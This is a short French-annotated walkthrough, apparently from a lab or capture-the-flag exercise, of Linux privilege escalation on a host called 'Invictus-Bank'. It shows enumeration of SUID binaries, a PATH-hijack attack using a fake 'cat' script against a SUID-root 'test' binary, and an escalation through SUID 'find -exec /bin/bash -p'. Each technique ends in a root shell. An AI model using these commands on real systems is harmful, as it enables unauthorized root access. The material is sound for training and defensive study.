# Privilege Esc

```
bthomson@Invictus-Bank:~$ find / -user root -perm -4000
find / -user root -perm -4000
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/find
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/mtr
find: `/proc/15707/task/15707/fd/5': No such file or directory
find: `/proc/15707/task/15707/fdinfo/5': No such file or directory
find: `/proc/15707/fd/5': No such file or directory
find: `/proc/15707/fdinfo/5': No such file or directory
/home/olivier/test.bkp
/home/bthomson/Program/clehen52/test
/home/bthomson/Program/clehen38/test
/home/bthomson/Program/clehen44/test

...

bthomson@Invictus-Bank:~/Program/clehen38$ ls -l                                                                       
ls -l                                                                                                                  
total 12
-rwsr-xr-x 1 root bthomson 8627 Dec 15  2022 test
bthomson@Invictus-Bank:~/Program/clehen38$ file test
file test
test: setuid ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=e97a703eb803aa5f867bfd46f747e419b20685a9, not stripped
bthomson@Invictus-Bank:~/Program/clehen38$ ./test
./test
Exploitation SetUID Path
bthomson@Invictus-Bank:~/Program/clehen38$ 




Création d'un script nommé “cat” qui execute un bash :
bthomson@Invictus-Bank:~/Program/clehen38$ echo "/bin/bash" > cat
echo "/bin/bash" > cat
bthomson@Invictus-Bank:~/Program/clehen38$ ls
ls
cat  test
bthomson@Invictus-Bank:~/Program/clehen38$ 

bthomson@Invictus-Bank:~/Program/clehen38$ chmod +x cat
chmod +x cat
bthomson@Invictus-Bank:~/Program/clehen38$ ls -l cat
ls -l cat
-rwxrwxr-x 1 bthomson bthomson 10 Sep 13 16:53 cat
bthomson@Invictus-Bank:~/Program/clehen38$ 


bthomson@Invictus-Bank:~/Program/clehen38$ echo $PATH
echo $PATH
/usr/bin:/bin
bthomson@Invictus-Bank:~/Program/clehen38$ pwd   
pwd
/home/bthomson/Program/clehen38
bthomson@Invictus-Bank:~/Program/clehen38$ export PATH=/home/bthomson/Program/clehen38:$PATH
<ogram/clehen38$ export PATH=/home/bthomson/Program/clehen38:$PATH           
bthomson@Invictus-Bank:~/Program/clehen38$ echo $PATH
echo $PATH
/home/bthomson/Program/clehen38:/usr/bin:/bin
bthomson@Invictus-Bank:~/Program/clehen38$ 

bthomson@Invictus-Bank:~/Program/clehen38$ ./test
./test
root@Invictus-Bank:~/Program/clehen38# 


Autre méthode d'exploitation du SUID avec find :
bthomson@Invictus-Bank:~/Program/clehen38$ find . -exec /bin/bash -p \; 
find . -exec /bin/bash -p \; 
bash-4.3# whoami
whoami
root
bash-4.3# 


```
